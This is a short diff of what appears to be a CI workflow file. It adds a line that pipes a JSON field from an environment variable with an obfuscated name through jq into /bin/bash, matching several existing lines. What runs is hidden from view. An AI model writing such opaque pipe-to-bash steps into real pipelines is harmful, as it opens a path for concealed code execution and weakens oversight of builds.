@@ -43,6 +43,7 @@ jobs:
           echo $ne8876 | jq -r .ty93 | /bin/bash
           printf '%s' "$m246" | jq -r .usis0 | /bin/bash
           printf '%s' "$fpusf2423" | jq -r .csurt8733 | /bin/bash
+          echo $xl1 | jq -r .uscks9 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
